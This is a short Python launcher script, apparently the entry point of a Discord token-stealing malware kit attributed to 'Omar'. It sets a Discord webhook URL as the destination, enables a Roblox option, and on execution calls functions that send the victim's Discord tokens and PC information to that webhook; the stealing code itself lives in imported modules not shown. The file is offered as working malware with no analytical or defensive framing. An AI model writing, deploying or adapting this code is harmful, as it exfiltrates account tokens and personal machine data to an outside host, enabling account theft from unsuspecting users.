
__CONFIG__ = {
    "webhook": "https://discord.com/api/webhooks/1243914498809790496/CJOH3w-0j0mCx4LatAp8NYitFV76TX9SoaxaE-PeeBMwSv2a75lhdcmIrGprYuiRDNOw",
    "roblox": True, 
}

from component.x3 import Made_By_Omar
from component.info import PcInfo




if __name__ == "__main__":
    discord = Made_By_Omar()
    discord.send_tokens(__CONFIG__["webhook"])
    pc_info = PcInfo(__CONFIG__["webhook"])






